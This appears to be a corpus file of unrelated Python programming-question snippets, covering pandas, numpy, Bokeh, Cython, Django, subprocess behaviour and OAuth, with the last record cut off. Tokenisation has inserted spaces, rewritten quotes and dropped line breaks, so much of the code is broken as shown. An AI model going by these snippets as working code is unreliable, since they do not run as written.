"Income Revenue IAP Ads Other-IncomeExpenses Developers In-house Contractors Advertising Other Expenses L1 L2 L3IncomeIncome RevenueIncome Revenue IAPIncome Revenue AdsIncome Other-IncomeExpenses Developers In-house ... etc for rownum in range ( 6 , ws.max_row+1 ) : accountName = str ( ws.cell ( row=rownum , column=1 ) .value ) indent = len ( accountName ) - len ( accountName.lstrip ( ' ' ) ) if indent == 0 : l1 = accountName l2 = `` l3 = `` elif indent == 3 : l2 = accountName l3 = `` else : l3 = accountName w.writerow ( [ l1 , l2 , l3 ] ) if indent == 0 : accountList = [ ] accountList.append ( ( indent , accountName ) ) elif indent > prev_indent : accountList.append ( ( indent , accountName ) ) elif indent < = prev_indent : max_indent = int ( max ( accountList , key=itemgetter ( 0 ) ) [ 0 ] ) while max_indent > = indent : accountList.pop ( ) max_indent = int ( max ( accountList , key=itemgetter ( 0 ) ) [ 0 ] ) accountList.append ( ( indent , accountName ) )"
"@ view_config ( route_name='LoginForm ' , request_method='POST ' , renderer='string ' ) class LoginForm ( SimpleObject ) : def __call__ ( self ) : emailAddress = self.request.params.get ( 'emailAddress ' ) password = self.request.params.get ( 'password ' ) if emailAddress ! = 'testemail @ gmail.com ' or password ! = 'testpassword ' : errorDictionary = { 'message ' : `` Either the email address or password is wrong . '' } self.request.response.status = 400 return json.dumps ( errorDictionary , default=json_util.default ) testUserGUID = '123123123 ' headers = remember ( self.request , testUserGUID ) return HTTPOk ( headers=headers )"
"list = [ ' a ' , ' b ' , ' c ' , ' c ' ] list ( set ( list ) )"
"source = ColumnDataSource ( result ) columns = [ TableColumn ( field= '' ts '' , title= '' Timestamp '' ) , TableColumn ( field= '' bid_qty '' , title= '' Bid Quantity '' ) , TableColumn ( field= '' bid_prc '' , title= '' Bid Price '' ) , TableColumn ( field= '' ask_prc '' , title= '' Ask Price '' ) , TableColumn ( field= '' ask_qty '' , title= '' Ask Quantity '' ) , ] data_table = DataTable ( source=source , columns=columns , fit_columns=True , width=1300 , height=800 ) show ( widgetbox ( [ data_table ] , sizing_mode = 'scale_both ' ) ) from bokeh.io import show , output_notebookfrom bokeh.layouts import widgetboxfrom bokeh.models import ColumnDataSourcefrom bokeh.models.widgets import TableColumn , DataTableimport pandas as pdoutput_notebook ( ) d = { 'one ' : pd.Series ( [ 1. , 2. , 3 . ] , index= [ ' a ' , ' b ' , ' c ' ] ) , 'two ' : pd.Series ( [ 1. , 2. , 3. , 4 . ] , index= [ ' a ' , ' b ' , ' c ' , 'd ' ] ) } df = pd.DataFrame ( d ) source = ColumnDataSource ( df ) columns = [ TableColumn ( field= '' one '' , title= '' One '' ) , TableColumn ( field= '' two '' , title= '' Two '' ) , ] data_table = DataTable ( source=source , columns=columns , fit_columns=True , width=800 , height=800 ) show ( widgetbox ( [ data_table ] , sizing_mode = 'scale_both ' ) )"
"{ ' A ' : 0 , ' B ' : 1 , ' C ' : 2 , 'D ' : 3 , etc } 2 0 01 0 30 5 14 1 2 words = { 'apple ' : 0 , 'orange ' : 1 , 'banana ' : 2 , 'pear ' : 3 } i = 0for k , v in words.items ( ) : v = i i += 1 words = dict ( zip ( terms.keys ( ) , range ( 0 , matrix.shape [ 0 ] ) ) )"
"cdef extern from `` VolumeHapticTool.h '' : cdef cppclass HDButtonEvent : bool isPressed ( ) unsigned int getButtonId ( ) Vec3 [ float ] getPosition ( ) ctypedef void ( *HDButtonCallback ) ( HDButtonEvent , void * ) cdef extern from `` Scene.h '' : cdef cppclass Scene : Scene ( ) void setDrillButtonCallback ( HDButtonCallback , void* ) cdef void pyHDButtonCallback ( HDButtonEvent e , void *user_data ) : print < object > user_data ( < object > user_data ) ( ( e.isPressed ( ) , e.getButtonId ( ) , topy_vec3f ( e.getPosition ( ) ) ) ) cdef class pyScene : cdef Scene * m_scene def __init__ ( self ) : self.m_scene = new Scene ( ) def __del__ ( self ) : del self.m_scene def setDrillButtonCallback ( self , func ) : print func self.m_scene.setDrillButtonCallback ( pyHDButtonCallback , < void* > func ) class RenderCanvas ( GLCanvas ) : def __init__ ( self , parent ) : self.scene = cybraincase.pyScene ( ) self.scene.setDrillButtonCallback ( self.OnDrillButtonPress ) def OnDrillButtonPress ( self , event ) : print event"
"# ! /usr/bin/env pythonfrom setuptools import setup , find_packagesimport sysif sys.argv [ 1 ] == 'test ' : import multiprocessing , logging from billiard import utilwith open ( 'requirements.txt ' ) as f : required = f.read ( ) .splitlines ( ) if sys.version_info < ( 2 , 7 , 0 ) : required.append ( 'importlib ' ) setup ( version= ' 0.1 ' , name= ' ... ' , description= ' ... ' , author= ' ... ' , author_email= ' ... ' , packages=find_packages ( ) , package_data= { } , install_requires=required , include_package_data=True , tests_require= [ 'billiard ' , 'nose==1.3 ' ] , test_suite='nose.collector ' )"
"CREATE TABLE Person ( Id int IDENTITY ( 1,1 ) NOT NULL PRIMARY KEY , MotherId int NOT NULL REFERENCES Person ( Id ) , FatherId int NOT NULL REFERENCES Person ( Id ) , FirstName nvarchar ( 255 ) ) class Person ( db.Model ) : mother = db.ReferenceProperty ( Person ) father = db.ReferenceProperty ( Person ) firstName = db.StringProperty ( ) children = db.SelfReferenceProperty ( collection_name='children_set ' ) dad.children.append ( childrenOne )"
"def myCOUNT ( l ) : newlist= [ [ x , y , z ] for x in l for y in l for z in l if ( z % y==0 and y % x==0 and l.index ( x ) < l.index ( y ) and l.index ( y ) < l.index ( z ) ) ] return len ( newlist ) > > > l= [ 1,2,3,4,5,6 ] > > > myCOUNT ( l ) 3"
"def generate_random_histogram ( ) : # Random bin locations between 0 and 100 bin_locations = np.random.rand ( 10 , ) * 100 bin_locations.sort ( ) # Random counts between 0 and 50 on those locations bin_counts = np.random.randint ( 50 , size=len ( bin_locations ) ) return { 'loc ' : bin_locations , 'count ' : bin_counts } # We can assume that the bin size is either pre-defined or that # the bin edges are on the middle-point between consecutive counts.hists = [ generate_random_histogram ( ) for x in xrange ( 3 ) ]"
"result db.query ( `` select * from TABLE order by ID desc limit 70 '' ) result = db.store_result ( ) m.set ( ' 1 ' , result,60 ) m.set ( ' 1 ' , result,60 ) File `` /usr/lib/python2.6/site-packages/memcache.py '' , line 466 , in setreturn self._set ( `` set '' , key , val , time , min_compress_len ) File `` /usr/lib/python2.6/site-packages/memcache.py '' , line 639 , in _setstore_info = self._val_to_store_info ( val , min_compress_len ) File `` /usr/lib/python2.6/site-packages/memcache.py '' , line 615 , in _val_to_store_infopickler.dump ( val ) UnpickleableError : Can not pickle objects m.set ( ' 1 ' , 'test',60 )"
app.pytemplates/|| -- index.html setup.pyapp/ __init__.py views.py models.py forms.py templates/ | -- -index.html from flask import Flaskapp = Flask ( __name__ ) import app.views # Name in setup.pyif __name__ == `` __main__ '' : app.run ( )
"def f ( ) : return 2def g ( ) : return 4def h ( ) : return 7def i ( ) : return Nonedef bind ( val , func ) : if val is None : return None else : return ( func ( ) ) unit = 0 > > > bind ( bind ( bind ( unit , f ) , i ) , h ) # Returns nothing > > > bind ( bind ( bind ( unit , f ) , g ) , h ) # Returns a value > > > 7"
"x_data = tf.placeholder ( tf.int32 , [ None , max_sequence_length ] ) y_output = tf.placeholder ( tf.int32 , [ None ] ) batch_size = 250 x_data = tf.placeholder ( tf.int32 , [ batch_size , max_sequence_length ] ) y_output = tf.placeholder ( tf.int32 , [ batch_size ] )"
# this will take time linear in n with the optimization # and quadratic time without the optimizationimport timestart = time.perf_counter ( ) s = `` for i in range ( n ) : s += ' a'total_time = time.perf_counter ( ) - starttime_per_iteration = total_time / n python -m timeit -s '' s= '' '' `` for i in range ( 10**7 ) : s+= ' a ' ''
@ interactdef _ ( order= ( 1..12 ) ) :
import pyximportpyximport.install ( ) import Cython_Mod1import Cython_Mod2 Cython_Mod1.obj : warning LNK4197 : export 'PyInit_Cython_Mod1 ' specified multiple times ; using first specification
"ID Found_IDs0 12345 [ 15443 , 15533 , 3433 ] 1 15533 [ 2234 , 16608 , 12002 , 7654 ] 2 6789 [ 43322 , 876544 , 36789 ] bad_ids = [ 15533 , 876544 , 36789 , 11111 ] df [ 'bad_id ' ] = [ c in l for c , l in zip ( bad_ids , df [ 'Found_IDs ' ] ) ] bad_ids = [ 15533 , 876544 ] ValueError : Length of values does not match length of index ID Found_IDs bad_id0 12345 [ 15443 , 15533 , 3433 ] True1 15533 [ 2234 , 16608 , 12002 , 7654 ] False2 6789 [ 43322 , 876544 , 36789 ] True ID Found_IDs bad_id0 12345 [ 15443 , 15533 , 3433 ] 155331 15533 [ 2234 , 16608 , 12002 , 7654 ] False2 6789 [ 43322 , 876544 , 36789 ] 876544 import pandas as pdresult_list = [ [ 12345 , [ 15443,15533,3433 ] ] , [ 15533 , [ 2234,16608,12002,7654 ] ] , [ 6789 , [ 43322,876544,36789 ] ] ] df = pd.DataFrame ( result_list , columns= [ 'ID ' , 'Found_IDs ' ] ) # works if list has four elements # bad_ids = [ 15533 , 876544 , 36789 , 11111 ] # fails if list has two elements ( less elements than the dataframe ) # ValueError : Length of values does not match length of indexbad_ids = [ 15533 , 876544 ] # coverting to Series does n't change things # bad_ids = pd.Series ( bad_ids ) # print ( type ( bad_ids ) ) # setting up a new column of false values does n't change things # df [ 'bad_id ' ] = Falseprint ( df ) df [ 'bad_id ' ] = [ c in l for c , l in zip ( bad_ids , df [ 'Found_IDs ' ] ) ] print ( bad_ids ) print ( df )"
"A = np.zeros ( 16 ) .reshape ( 4,4 ) A [ [ 1,3 ] , [ 1:3 ] ] = 1 A [ [ 1,3 ] , : ] [ : , [ 1 , 3 ] ] = 1"
"fh = open ( `` /var/www/html/logo.png '' , `` wb '' ) fh.write ( photo.decode ( 'base64 ' ) ) fh.close ( )"
"class IngredientAll ( generics.ListAPIView ) : permission_classes = ( permissions.IsAuthenticated , ) model = Ingredientserializer_class = IngredientListSerializerdef get_queryset ( self ) : userCompanyId = self.request.user.get_profile ( ) .companyId ingredients = Ingredient.objects.filter ( company = userCompanyId ) return ingredients class IngredientAllTestCase ( unittest.TestCase ) : def setUp ( self ) : self.user=User ( username='jimish ' ) password = 'password ' self.user.set_password ( password ) self.user.save ( ) self.client = Client ( ) self.client.login ( username=self.user.username , password=password ) def test_IngredientAll ( self ) : url = reverse ( 'lib : ingredient-all ' ) response = self.client.get ( url ) self.assertEqual ( response.status_code , status.HTTP_200_OK ) url ( r'^allingredients $ ' , views.IngredientAll.as_view ( ) , name='ingredient-all ' ) , response = self.client.get ( url ) response = callback ( request , *callback_args , **callback_kwargs ) raise DatabaseError ( 'This query is not supported by the database . ' )"
"def disp ( i , j , winSize , leftIm , rightIm ) : # calculate disparity for a given point width = leftIm.shape [ 1 ] height = leftIm.shape [ 0 ] w = winSize / 2 minSAD = 9223372036854775807 # max int for d in range ( 23 ) : SAD = 0.0 # SAD k = i - w v = i + w m = j - w n = j + w for p in range ( k , v+1 ) : # window - x for q in range ( m , n+1 ) : # window y if ( p - d > 0 and p < width and q < height ) : SAD += abs ( ( int ( leftIm [ q ] [ p ] ) - int ( rightIm [ q ] [ p - d ] ) ) ) if ( SAD < minSAD ) : minSAD = SAD disp = d # print `` % d , % d '' % ( i , j ) return ( disp , SAD ) def dispMap ( winSize , leftIm , rightIm ) : width = leftIm.shape [ 1 ] height = leftIm.shape [ 0 ] outIm = np.zeros ( ( height , width ) ) SADstore = np.zeros ( ( height , width ) ) w = winSize / 2 for i in range ( w , width-w ) : for j in range ( w , height/3-w ) : dispout = disp ( i , j , winSize , leftIm , rightIm ) outIm [ j ] [ i ] = 1 * dispout [ 0 ] # should normally multiply by 4 SADstore [ j ] [ i ] = dispout [ 1 ] return ( outIm , SADstore ) disp12 = dispMap ( 9 , view1 , view2 ) disp12im = disp12 [ 0 ] misc.imsave ( 'disp121.pgm ' , disp12im )"
"In [ 12 ] : % paste # epdb1.py -- experiment with the Python debugger , pdbimport pdba = `` aaa '' pdb.set_trace ( ) b = `` bbb '' c = `` ccc '' final = a + b + cprint final # # -- End pasted text -- -- Return -- > < ipython-input-12-48afa1c7ad72 > ( 4 ) < module > ( ) - > None- > pdb.set_trace ( ) ( Pdb ) l 1 # epdb1.py -- experiment with the Python debugger , pdb 2 import pdb 3 a = `` aaa '' 4 - > pdb.set_trace ( ) 5 b = `` bbb '' 6 c = `` ccc '' 7 final = a + b + c 8 print final [ EOF ] ( Pdb ) n > /Users/jg/anaconda/lib/python2.7/site-packages/IPython/core/interactiveshell.py ( 3038 ) run_code ( ) - > sys.excepthook = old_excepthook ( Pdb ) l3033 self.hooks.pre_run_code_hook ( ) 3034 # rprint ( 'Running code ' , repr ( code_obj ) ) # dbg3035 exec ( code_obj , self.user_global_ns , self.user_ns ) 3036 finally:3037 # Reset our crash handler in place3038 - > sys.excepthook = old_excepthook3039 except SystemExit as e:3040 if result is not None:3041 result.error_in_exec = e3042 self.showtraceback ( exception_only=True ) 3043 warn ( `` To exit : use 'exit ' , 'quit ' , or Ctrl-D. '' , level=1 ) ( Pdb ) help nextn ( ext ) Continue execution until the next line in the current functionis reached or it returns ."
"> > > from collections import Iterable > > > d = { 1:2 , 3:4 } > > > isinstance ( d.viewvalues ( ) , Iterable ) True > > >"
"import numpy as npimport statsmodels as smfrom statsmodels.tsa.statespace.structural import UnobservedComponentsnp.random.seed ( 12345 ) ar = np.r_ [ 1 , 0.9 ] ma = np.array ( [ 1 ] ) arma_process = sm.tsa.arima_process.ArmaProcess ( ar , ma ) X = 100 + arma_process.generate_sample ( nsample=100 ) y = 1.2 * x + np.random.normal ( size=100 ) y [ 70 : ] += 10plt.plot ( X , label= ' X ' ) plt.plot ( y , label= ' y ' ) plt.axvline ( 69 , linestyle= ' -- ' , color= ' k ' ) plt.legend ( ) ; ss = { } ss [ `` endog '' ] = y [ :70 ] ss [ `` level '' ] = `` llevel '' ss [ `` exog '' ] = X [ :70 ] model = UnobservedComponents ( **ss ) trained_model = model.fit ( ) trained_model.generate_random_series ( nsample=100 , exog=X [ 70 : ] ) mod1 = UnobservedComponents ( np.zeros ( y_post ) , 'llevel ' , exog=X_post ) mod1.simulate ( f_model.params , len ( X_post ) ) samples = 1000r = 0y_post_sum = y_post.sum ( ) for _ in range ( samples ) : sim = mod1.simulate ( f_model.params , len ( X_post ) , initial_state=0 , state_shocks=np.random.normal ( size=len ( X_post ) ) ) r += sim.sum ( ) > = y_post_sumprint ( r / samples ) initial_state_cov = ( np.eye ( self.k_states , dtype=self.ssm.transition.dtype ) * self.ssm.initial_variance ) initial_state = np.random.multivariate_normal ( self._initial_state , self._initial_state_cov ) mod1 = UnobservedComponents ( np.zeros ( len ( X_post ) ) , level='llevel ' , exog=X_post , initial_variance=1 ) sim = mod1.simulate ( f_model.params , len ( X_post ) ) plt.plot ( sim , label='simul ' ) plt.plot ( y_post , label= ' y ' ) plt.legend ( ) ; print ( sim.sum ( ) > y_post.sum ( ) )"
"The struct-of-application and struct-of-world The [ application_of_struct ] ( http : //application_of_struct ) and [ world-of-struct ] ( http : //world-of-struct ) In [ 10 ] : p.sub ( 'struct ' , 'The struct-of-application and struct-of-world ' ) Out [ 10 ] : 'The struct and struct '"
a.pytest/ test_a.py import a ERROR : Failure : ImportError ( No module named a )
"def test_vote_form_with_multiple_choices_allowed_and_submitted ( self ) : `` '' '' If multiple choices are allowed and submitted , the form should be valid. `` '' '' vote_form = VoteForm ( { 'choice ' : [ 1 , 2 ] } , instance=create_question ( 'Dummy question ' , -1 , [ Choice ( choice_text='First choice ' ) , Choice ( choice_text='Second choice ' ) ] , allow_multiple_choices=True ) ) self.assertTrue ( vote_form.is_valid ( ) ) self.assertQuerysetEqual ( vote_form.cleaned_data [ 'choice ' ] , [ ' < Choice : First choice > ' , ' < Choice : Second choice > ' ] )"
"# ! /usr/bin/env pythonimport sysimport gigi.require_version ( 'Gtk ' , ' 3.0 ' ) from gi.repository import Gtkfrom gi.repository import Gdkw = Gtk.Window ( ) screen = Gdk.Screen.get_default ( ) print ( `` Montors : % d '' % screen.get_n_monitors ( ) ) if len ( sys.argv ) > 1 : n = int ( sys.argv [ 1 ] ) else : n = 0l = Gtk.Button ( label= '' Hello , % d monitors ! '' % screen.get_n_monitors ( ) ) w.add ( l ) w.show_all ( ) w.fullscreen_on_monitor ( screen , n ) l.connect ( `` clicked '' , Gtk.main_quit ) w.connect ( `` destroy '' , Gtk.main_quit ) Gtk.main ( )"
"print ( 'int : % i . Float : % f . String : % s ' % ( 54 , 34.434 , 'some text ' ) ) print ( 'int : % r . Float : % r . String : % r ' % ( 54 , 34.434 , 'some text ' ) ) print ( 'int : % s . Float : % s . String : % s ' % ( 54 , 34.434 , 'some text ' ) )"
"import numpy as np # memory allocations ( everything works fine ) a = np.zeros ( ( 1192953 , 192 , 32 ) , dtype='f8 ' ) b = np.zeros ( ( 1192953 , 192 ) , dtype='f8 ' ) c = np.zeros ( ( 192 , 32 ) , dtype='f8 ' ) a [ : ] = b [ : , : , np.newaxis ] - c [ np.newaxis , : , : ] # memory explodes here"
"import sysprint ( `` Zero : `` + str ( sys.getsizeof ( 0 ) ) ) print ( `` One : `` + str ( sys.getsizeof ( 1 ) ) ) print ( `` False : `` + str ( sys.getsizeof ( False ) ) ) print ( `` True : `` + str ( sys.getsizeof ( True ) ) ) # Prints : # Zero : 24 # One : 28 # False : 24 # True : 28 for n in range ( 0 , 12 ) : print ( str ( n ) + `` : `` + str ( sys.getsizeof ( n ) ) ) # Prints : # 0 : 24 # 1 : 28 # 2 : 28 # 3 : 28 # 4 : 28 # 5 : 28 # 6 : 28 # 7 : 28 # 8 : 28 # 9 : 28 # 10 : 28 # 11 : 28"
"function simData ( ) t_max = 10.0 dt = 0.05 x = 0.0 t = 0.0 function it ( ) while t < t_max x = sin ( pi*t ) t = t+dt produce ( x , t ) end end Task ( it ) end LoadError : PyError ( : PyObject_Call ) < type 'exceptions.TypeError ' > TypeError ( 'PyCall.jlwrap object is not an iterator ' , ) File `` /usr/local/lib/python2.7/dist-packages/matplotlib/animation.py '' , line 1067 , in __init__ TimedAnimation.__init__ ( self , fig , **kwargs ) File `` /usr/local/lib/python2.7/dist-packages/matplotlib/animation.py '' , line 913 , in __init__ *args , **kwargs ) File `` /usr/local/lib/python2.7/dist-packages/matplotlib/animation.py '' , line 591 , in __init__ self._init_draw ( ) File `` /usr/local/lib/python2.7/dist-packages/matplotlib/animation.py '' , line 1092 , in _init_draw self._draw_frame ( next ( self.new_frame_seq ( ) ) ) while loading In [ 5 ] , in expression starting on line 42 in pyerr_check at /home/diegotap/.julia/v0.4/PyCall/src/exception.jl:56 [ inlined code ] from /home/diegotap/.julia/v0.4/PyCall/src/exception.jl:81 in pycall at /home/diegotap/.julia/v0.4/PyCall/src/PyCall.jl:402 in call at /home/diegotap/.julia/v0.4/PyCall/src/PyCall.jl:429"
"from pyparsing import Word , nums , alphas , delimitedList , Group , oneOffrom pprint import pprintfield = Word ( alphas ) ( `` field '' ) operator = oneOf ( `` = + '' ) ( `` operator '' ) string_value = Word ( alphas ) ( `` string '' ) int_value = Word ( nums ) .setParseAction ( lambda t : int ( t [ 0 ] ) ) ( `` int '' ) value = ( string_value | int_value ) ( `` value '' ) expression = Group ( field + operator + value ) ( `` expression '' ) grammar = Group ( delimitedList ( expression , delim= '' & & '' ) ) ( `` expr_list '' ) def test ( s ) : print `` Parsing ' { 0 } ' '' .format ( s ) tokenized = grammar.parseString ( s ) for f in tokenized : e = f.expression pprint ( dict ( e.items ( ) ) ) if __name__ == `` __main__ '' : test ( `` foo=1 '' ) test ( `` foo=1 & & bar=2 '' ) test ( `` foobar=2 & & snakes=4 '' ) Parsing 'foo=1 ' { 'field ' : 'foo ' , 'int ' : 1 , 'operator ' : '= ' , 'value ' : 1 } Parsing 'foo=1 & & bar=2 ' { 'field ' : 'bar ' , 'int ' : 2 , 'operator ' : '= ' , 'value ' : 2 } Parsing 'foobar=2 & & snakes=4 ' { 'field ' : 'snakes ' , 'int ' : 4 , 'operator ' : '= ' , 'value ' : 4 }"
\s* # define ( .*\\\n ) + [ \S ] + ( ? ! \\ ) # define foo ( x ) if ( x ) \doSomething ( x ) # define foo ( x ) if ( x ) \doSomething ( x ) normalCode ( ) ;
"//C # static void Main ( string [ ] args ) { using ( Py.GIL ( ) ) { PythonEngine.Exec ( `` print ( __name__ ) \n '' + //output is `` buitlins '' `` if __name__ == 'builtins ' : \n '' + `` import test_package\n '' + //import Python code below `` test_package.async_test ( ) \n '' ) ; } } # Pythonimport concurrent.futuresdef heavy_calc ( x ) : for i in range ( int ( 1e7 ) * x ) : i*2def async_test ( ) : # multiprocessing with concurrent.futures.ProcessPoolExecutor ( max_workers=8 ) as executor : futures = [ executor.submit ( heavy_calc , x ) for x in range ( 10 ) ] ( done , notdone ) = concurrent.futures.wait ( futures ) for future in futures : print ( future.result ( ) )"
"import timeimport subprocessproc = subprocess.Popen ( './child.sh ' ) print ( `` Dad : I have begotten a son ! `` ) time.sleep ( 1 ) proc.kill ( ) proc.wait ( ) print ( `` Dad : My son hath died ! `` ) time.sleep ( 2 ) print ( `` Dad : Why does my grandson still speak ? '' ) # ! /bin/bash./grandchild.sh & echo `` Child : I had a son ! `` for ( ( i = 0 ; i < 10 ; i++ ) ) ; do echo `` Child : Hi Dad , meet your grandson ! '' sleep 1doneexit 0 # ! /bin/bashfor ( ( i = 0 ; i < 10 ; i++ ) ) ; do echo `` Grandchild : Wahhh '' sleep 1doneexit 0 import osf = open ( os.devnull , '' w '' ) proc.stdout = proc.stderr = f > ./parent.pyDad : I have begotten a son ! Child : I had a son ! Child : Hi Dad , meet your grandson ! Grandchild : WahhhDad : My son hath died ! Grandchild : WahhhGrandchild : WahhhDad : My grandson still speaketh ! Grandchild : WahhhGrandchild : WahhhGrandchild : WahhhGrandchild : WahhhGrandchild : WahhhGrandchild : WahhhGrandchild : Wahhh"
"def nSphereVolume ( dim , iter ) : i = 0 j = 0 r = 0 total0 = 0 total1 = 0 while ( i < iter ) : total0 = 0 ; while ( j < dim ) : r = 2.0*np.random.uniform ( 0,1 , iter ) - 1.0 total0 += r*r j += 1 if ( total0 < 1 ) : total1 += 1 i += 1 return np.pow ( 2.0 , dim ) * ( total1/iter ) nSphereVolume ( 10,1000 ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -ValueError Traceback ( most recent call last ) < ipython-input-253-44104dc9a692 > in < module > ( ) 20 return np.pow ( 2.0 , dim ) * ( total1/iter ) 21 -- - > 22 nSphereVolume ( 10,1000 ) < ipython-input-253-44104dc9a692 > in nSphereVolume ( dim , iter ) 14 j += 1 15 -- - > 16 if ( total0 < 1 ) : 17 total1 += 1 18 i += 1ValueError : The truth value of an array with more than one element is ambiguous . Use a.any ( ) or a.all ( )"
"... < graph > < graph-enabled > true < /graph-enabled > < graph-name > dev-db-01 < /graph-name > < graph-type > orientgraph < /graph-type > < graph-location > local : * < path to ... > */databases/orientdb/dev-db-01 < /graph-location > < properties > < username > admin < /username > < password > admin < /password > < /properties > < extensions > < allows > < allow > tp : gremlin < /allow > < /allows > < /extensions > < /graph > ... from bulbs.rexster import Graphfrom bulbs.config import Configconfig = Config ( `` http : //localhost:8182/dev-db-01/ '' , username= '' admin '' , password= '' admin '' ) g = Graph ( config ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /opt/local/Library/Frameworks/Python.framework/Versions/3.2/lib/python3.2/site-packages/bulbs/rexster/graph.py '' , li ne 56 , in __init__ super ( Graph , self ) .__init__ ( config ) File `` /opt/local/Library/Frameworks/Python.framework/Versions/3.2/lib/python3.2/site-packages/bulbs/base/graph.py '' , line 58 , in __init__ self.vertices = self.build_proxy ( Vertex ) File `` /opt/local/Library/Frameworks/Python.framework/Versions/3.2/lib/python3.2/site-packages/bulbs/base/graph.py '' , line 124 , in build_proxy return self.factory.build_element_proxy ( element_class , index_class ) File `` /opt/local/Library/Frameworks/Python.framework/Versions/3.2/lib/python3.2/site-packages/bulbs/factory.py '' , line 19 , in build_element_proxy primary_index = self.get_index ( element_class , index_class , index_name ) File `` /opt/local/Library/Frameworks/Python.framework/Versions/3.2/lib/python3.2/site-packages/bulbs/factory.py '' , line 27 , in get_index index = index_proxy.get_or_create ( index_name ) File `` /opt/local/Library/Frameworks/Python.framework/Versions/3.2/lib/python3.2/site-packages/bulbs/rexster/index.py '' , li ne 80 , in get_or_create resp = self.client.get_or_create_vertex_index ( index_name , index_params ) File `` /opt/local/Library/Frameworks/Python.framework/Versions/3.2/lib/python3.2/site-packages/bulbs/rexster/client.py '' , l ine 668 , in get_or_create_vertex_index resp = self.gremlin ( script , params ) File `` /opt/local/Library/Frameworks/Python.framework/Versions/3.2/lib/python3.2/site-packages/bulbs/rexster/client.py '' , l ine 356 , in gremlin return self.request.post ( gremlin_path , params ) File `` /opt/local/Library/Frameworks/Python.framework/Versions/3.2/lib/python3.2/site-packages/bulbs/rest.py '' , line 131 , i n post return self.request ( POST , path , params ) File `` /opt/local/Library/Frameworks/Python.framework/Versions/3.2/lib/python3.2/site-packages/bulbs/rest.py '' , line 186 , i n request return self.response_class ( http_resp , self.config ) File `` /opt/local/Library/Frameworks/Python.framework/Versions/3.2/lib/python3.2/site-packages/bulbs/rexster/client.py '' , l ine 198 , in __init__ self.handle_response ( response ) File `` /opt/local/Library/Frameworks/Python.framework/Versions/3.2/lib/python3.2/site-packages/bulbs/rexster/client.py '' , l ine 222 , in handle_response response_handler ( http_resp ) File `` /opt/local/Library/Frameworks/Python.framework/Versions/3.2/lib/python3.2/site-packages/bulbs/rest.py '' , line 39 , in not_found raise LookupError ( http_resp ) LookupError : ( { 'date ' : 'Thu , 20 Feb 2014 07:08:20 GMT ' , 'status ' : '404 ' , 'access-control-allow-origin ' : '* ' , 'content-lengt h ' : ' 0 ' , 'server ' : 'grizzly/2.2.16 ' } , b '' )"
"gru_out = Bidirectional ( GRU ( hiddenlayer_num , return_sequences=True ) ) ( embedded ) # Tensor ( `` concat_v2_8:0 '' , shape= ( ? , ? , 256 ) , dtype=float32 )"
"Set-ItemProperty : Can not find path 'HKCU : \Software\Python\PythonCore\2.7\InstallPath ' because it does not exist.At C : \Users\ ... \Documents\WindowsPowerShell\Modules\virtualenvwrapper\win.psm1:127 char:21+ set-itemproperty < < < < -path `` HKCU : /Software/Python/PythonCore/ $ pyVer/InstallPath '' -name `` ( default ) '' -value $ pyBase + CategoryInfo : ObjectNotFound : ( HKCU : \Software\ ... 2.7\InstallPath : String ) [ Set-ItemProperty ] , ItemNotFo undException + FullyQualifiedErrorId : PathNotFound , Microsoft.PowerShell.Commands.SetItemPropertyCommandSet-ItemProperty : Can not find path 'HKCU : \Software\Python\PythonCore\2.7\PythonPath ' because it does not exist.At C : \Users\ ... \Documents\WindowsPowerShell\Modules\virtualenvwrapper\win.psm1:128 char:21+ set-itemproperty < < < < -path `` HKCU : /Software/Python/PythonCore/ $ pyVer/PythonPath '' -name `` ( default ) '' -value `` $ pyBase\Lib ; $ pyBase\DLLs ; $ pyBase\Lib\lib-tk '' + CategoryInfo : ObjectNotFound : ( HKCU : \Software\ ... \2.7\PythonPath : String ) [ Set-ItemProperty ] , ItemNotFo undException + FullyQualifiedErrorId : PathNotFound , Microsoft.PowerShell.Commands.SetItemPropertyCommand"
"y = [ [ 1 ] , [ 1,2 ] , [ 1,2,3 ] , ... ... . [ 2 ] , [ 2,3 ] , [ 2,3,4 ] ... .. [ 8 ] ]"
"import numpy as npimport psutilfrom multiprocessing import Processmem=psutil.virtual_memory ( ) large_amount=int ( 0.75*mem.available ) def florp ( ) : print ( `` florp '' ) def bigdata ( ) : return np.ones ( large_amount , dtype=np.int8 ) if __name__=='__main__ ' : foo=bigdata ( ) # Allocated 0.75 of the ram , no problems p=Process ( target=florp ) p.start ( ) # Out of memory because bigdata is copied ? print ( `` Wow '' ) p.join ( ) [ ebuild R ] dev-lang/python-3.4.1:3.4 : :gentoo USE= '' gdbm ipv6 ncurses readline ssl threads xml -build -examples -hardened -sqlite -tk -wininst '' 0 KiB"
"# -*- coding : utf-8 -*-import osimport argparseimport httplib2import loggingfrom apiclient.discovery import buildfrom oauth2client import toolsfrom oauth2client.django_orm import Storagefrom oauth2client import xsrfutilfrom oauth2client.client import flow_from_clientsecretsfrom django.http import HttpResponsefrom django.http import HttpResponseBadRequestfrom django.http import HttpResponseRedirectfrom django.shortcuts import render_to_responsefrom django.core.urlresolvers import reversefrom django.contrib import authfrom django.contrib.auth.decorators import login_requiredfrom django.conf import settingsfrom apps.tecnico.models import Credentials , FlowCLIENT_SECRETS = os.path.join ( os.path.dirname ( __file__ ) , '../../client_secrets.json ' ) @ login_requireddef index ( request ) : storage = Storage ( Credentials , 'id ' , request.user , 'credential ' ) FLOW = flow_from_clientsecrets ( CLIENT_SECRETS , scope='https : //www.googleapis.com/auth/calendar.readonly ' , redirect_uri='http : //MY_URL:8000/oauth2/oauth2callback ' ) credential = storage.get ( ) if credential is None or credential.invalid is True : FLOW.params [ 'state ' ] = xsrfutil.generate_token ( settings.SECRET_KEY , request.user ) authorize_url = FLOW.step1_get_authorize_url ( ) f = Flow ( id=request.user , flow=FLOW ) f.save ( ) return HttpResponseRedirect ( authorize_url ) else : http = httplib2.Http ( ) http = credential.authorize ( http ) service = build ( serviceName='calendar ' , version='v3 ' , http=http , developerKey='MY_DEV_KEY_FROM_GOOGLE_CONSOLE ' ) events = service.events ( ) .list ( calendarId='primary ' ) .execute ( ) return render_to_response ( 'calendario/welcome.html ' , { 'events ' : events [ 'items ' ] , } ) @ login_requireddef auth_return ( request ) : if not xsrfutil.validate_token ( settings.SECRET_KEY , request.REQUEST [ 'state ' ] , request.user ) : return HttpResponseBadRequest ( ) storage = Storage ( Credentials , 'id ' , request.user , 'credential ' ) FLOW = 